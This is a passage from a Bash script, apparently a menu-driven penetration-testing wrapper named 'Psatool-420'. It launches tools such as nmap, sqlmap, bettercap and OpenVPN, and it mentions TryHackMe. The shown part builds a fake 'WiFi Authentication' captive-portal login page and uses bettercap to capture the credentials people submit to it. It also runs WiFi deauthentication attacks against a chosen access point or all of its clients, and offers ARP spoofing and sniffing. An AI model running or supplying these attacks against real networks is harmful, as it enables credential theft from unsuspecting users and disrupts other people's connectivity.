        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 3px; cursor: pointer; }
        .error { color: red; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>WiFi Authentication</h2>
        <p>Please sign in to access the internet</p>
        <form method="POST" action="login.php">
            <div class="error" id="error"></div>
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
EOF
            
            echo -e "\033[1;33m[*] Starting captive portal...\033[0m"
            echo -e "\033[1;33m[*] Captured credentials will be logged by Bettercap.\033[0m"
            echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
            
            sudo bettercap -iface $interface -caplet /tmp/captive_portal.cap
            
            # Cleanup
            rm /tmp/captive_portal.cap
            rm -rf /tmp/www
            ;;
            
        7)
            # WiFi Monitoring/Deauth
            echo -e "\033[1;34mEnter wireless interface in monitor mode (e.g., wlan0mon):\033[0m"
            read wlan_interface
            
            if [[ -z "$wlan_interface" ]]; then
                echo -e "\033[1;31mInterface required!\033[0m"
                return
            fi
            
            echo -e "\033[1;34mSelect operation:\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mWiFi network discovery\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mDeauthentication attack\033[0m"
            echo -n "Enter your choice: "
            read wifi_choice
            
            case $wifi_choice in
                1)
                    # WiFi discovery
                    echo 'wifi.recon on' > /tmp/wifi_recon.cap
                    echo 'ticker on' >> /tmp/wifi_recon.cap
                    echo 'wifi.show' >> /tmp/wifi_recon.cap
                    
                    echo -e "\033[1;33m[*] Starting WiFi reconnaissance...\033[0m"
                    echo -e "\033[1;33m[*] Press Ctrl+C to stop scanning.\033[0m"
                    
                    sudo bettercap -iface $wlan_interface -caplet /tmp/wifi_recon.cap
                    rm /tmp/wifi_recon.cap
                    ;;
                    
                2)
                    # Deauth attack
                    echo -e "\033[1;34mEnter target BSSID (MAC of AP):\033[0m"
                    read target_bssid
                    
                    echo -e "\033[1;34mEnter client MAC (leave empty to deauth all clients):\033[0m"
                    read client_mac
                    
                    if [[ -z "$target_bssid" ]]; then
                        echo -e "\033[1;31mTarget BSSID required!\033[0m"
                        return
                    fi
                    
                    # Create deauth caplet
                    echo 'wifi.recon on' > /tmp/wifi_deauth.cap
                    
                    if [[ -z "$client_mac" ]]; then
                        echo "wifi.deauth $target_bssid" >> /tmp/wifi_deauth.cap
                    else
                        echo "wifi.deauth $target_bssid $client_mac" >> /tmp/wifi_deauth.cap
                    fi
                    
                    echo -e "\033[1;33m[*] Starting deauthentication attack...\033[0m"
                    echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
                    
                    sudo bettercap -iface $wlan_interface -caplet /tmp/wifi_deauth.cap
                    rm /tmp/wifi_deauth.cap
                    ;;
                    
                *)
                    echo -e "\033[1;31mInvalid choice!\033[0m"
                    ;;
            esac
            ;;

8)
            # Custom Bettercap Command
            if ! get_interface; then return; fi
            
            echo -e "\033[1;34mEnter custom Bettercap caplet commands (one per line, end with empty line):\033[0m"
            echo -e "\033[1;33m[*] Examples: net.probe on, arp.spoof on, net.sniff on\033[0m"
            
            # Create temporary caplet file
            > /tmp/custom_caplet.cap
            
            while true; do
                read -p "> " custom_command
                
                # Break on empty line
                if [[ -z "$custom_command" ]]; then
                    break
                fi
                
                echo "$custom_command" >> /tmp/custom_caplet.cap
            done
            
            echo -e "\033[1;33m[*] Running custom Bettercap commands...\033[0m"
            echo -e "\033[1;33m[*] Press Ctrl+C to stop.\033[0m"
            
            sudo bettercap -iface $interface -caplet /tmp/custom_caplet.cap
            rm /tmp/custom_caplet.cap
            ;;
            
        9)
            # Return to main menu
            echo -e "\033[1;33m[*] Returning to main menu...\033[0m"
            return
            ;;
            
        *)
            echo -e "\033[1;31mInvalid choice!\033[0m"
            ;;
    esac
    
    # Ask if user wants to perform another Bettercap operation
    echo -e "\n\033[1;34mDo you want to perform another Bettercap operation? (y/n):\033[0m"
    read another_operation
    
    if [[ "$another_operation" == "y" || "$another_operation" == "Y" ]]; then
        run_bettercap
    else
        echo -e "\033[1;33m[*] Returning to main menu...\033[0m"
    fi
}

# Function to manage OpenVPN connection
run_openvpn() {
    # Create config directory if it doesn't exist
    mkdir -p ~/.psatool/config
    
    # Configuration file to store the OVPN file path
    CONFIG_FILE=~/.psatool/config/ovpn_config
    clear
    figlet -f  slant  "Open VPN" | lolcat
    echo -e "\n\033[1;34m========================\033[0m"
    echo -e "\033[1;34mSelect operation:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mConnect to TryHackMe\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mDisconnect from VPN\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mChange OVPN file\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mBack to main menu\033[0m"
    echo -n "Enter your choice: "
    read vpn_choice
    
    case $vpn_choice in
        1)
            # Check if OVPN file path is already saved
            if [ -f "$CONFIG_FILE" ]; then
                OVPN_FILE=$(cat "$CONFIG_FILE")
                
                # Verify that the file still exists
                if [ ! -f "$OVPN_FILE" ]; then
                    echo -e "\033[1;31mSaved OVPN file not found. Please provide a new path.\033[0m"
                    echo -e "\033[1;34mEnter the path to your TryHackMe OVPN file:\033[0m"
                    read OVPN_FILE
                    echo "$OVPN_FILE" > "$CONFIG_FILE"
                fi
            else
                # Ask for OVPN file path
                echo -e "\033[1;34mEnter the path to your TryHackMe OVPN file:\033[0m"
                read OVPN_FILE
                echo "$OVPN_FILE" > "$CONFIG_FILE"
            fi
            
            # Check if file exists
            if [ ! -f "$OVPN_FILE" ]; then
                echo -e "\033[1;31mOVPN file not found! Please check the path and try again.\033[0m"
                echo -e "\033[1;33mPress Enter to continue...\033[0m"
                read
                return
            fi
            
            # Check if already connected
            if pgrep -f "openvpn --config" > /dev/null; then
                echo -e "\033[1;33mVPN connection is already active. Disconnect first if you want to reconnect.\033[0m"
                echo -e "\033[1;33mPress Enter to continue...\033[0m"
                read
                return
            fi
            
            # Open a new terminal window with OpenVPN
            echo -e "\033[1;33m[*] Launching OpenVPN in a new terminal window...\033[0m"
            
            # Different terminal commands based on desktop environment
            if command -v gnome-terminal &> /dev/null; then
                gnome-terminal -- bash -c "sudo openvpn --config \"$OVPN_FILE\"; read -p 'Press Enter to close this window...'"
            elif command -v xterm &> /dev/null; then
                xterm -e "sudo openvpn --config \"$OVPN_FILE\"; read -p 'Press Enter to close this window...'" &
            elif command -v konsole &> /dev/null; then
                konsole --new-tab -e "sudo openvpn --config \"$OVPN_FILE\"; read -p 'Press Enter to close this window...'" &
            elif command -v xfce4-terminal &> /dev/null; then
                xfce4-terminal -e "sudo openvpn --config \"$OVPN_FILE\"; read -p 'Press Enter to close this window...'" &
            else
                echo -e "\033[1;31mNo supported terminal found. Starting OpenVPN in background.\033[0m"
                sudo openvpn --config "$OVPN_FILE" --daemon
            fi
            
            echo -e "\033[1;32m[*] OpenVPN connection initiated. Check the new terminal window for progress.\033[0m"
            echo -e "\033[1;33mPress Enter to continue...\033[0m"
            read
            ;;
            
        2)
            # Disconnect from VPN
            if pgrep -f "openvpn --config" > /dev/null; then
                echo -e "\033[1;33m[*] Disconnecting from VPN...\033[0m"
                sudo killall openvpn
                echo -e "\033[1;32m[*] VPN disconnected successfully.\033[0m"
            else
                echo -e "\033[1;31mNo active VPN connection found.\033[0m"
            fi
            echo -e "\033[1;33mPress Enter to continue...\033[0m"
            read
            ;;
            
        3)
            # Change OVPN file
            echo -e "\033[1;34mEnter the path to your new TryHackMe OVPN file:\033[0m"
            read OVPN_FILE
            
            if [ -f "$OVPN_FILE" ]; then
                echo "$OVPN_FILE" > "$CONFIG_FILE"
                echo -e "\033[1;32m[*] OVPN file path updated successfully.\033[0m"
            else
                echo -e "\033[1;31mFile not found! Path not updated.\033[0m"
            fi
            echo -e "\033[1;33mPress Enter to continue...\033[0m"
            read
            ;;
            
        4)
            # Return to main menu
            return
            ;;
            
        *)
            echo -e "\033[1;31mInvalid choice!\033[0m"
            echo -e "\033[1;33mPress Enter to continue...\033[0m"
            read
            ;;
    esac
}

# Function to check VPN status
check_vpn_status() {
    if pgrep -f "openvpn --config" > /dev/null; then
        # Get current public IP
        PUBLIC_IP=$(curl -s ifconfig.me || echo "Unknown")
        echo -e "\033[1;32m[VPN Connected | IP: $PUBLIC_IP]\033[0m"
    else
        echo -e "\033[1;31m[VPN Disconnected]\033[0m"
    fi
}



# Main execution loop
main() {
    while true; do
        show_banner
        show_menu
        read choice
        
        case $choice in
            1)
                run_nmap
                ;;
            2)
                run_gobuster
                ;;
            3)
                run_wpscan
                ;;
            4)
                run_john
                ;;
            5)
                run_netcat
                ;;
            6)
                run_sqlmap
                ;;
            7)
                run_nikto
                ;;
            8)
                run_osint
                ;;
            9)
                run_bettercap
                ;;
            10)
                run_openvpn
                ;;
            69)
                echo -e "\033[1;32m[*] Thank you for using Psatool-420!\033[0m"
                exit 0
                ;;
            *)
                echo -e "\033[1;31mInvalid option. Please try again.\033[0m"
                sleep 2
                ;;
        esac
    done
}

# Start the program
main
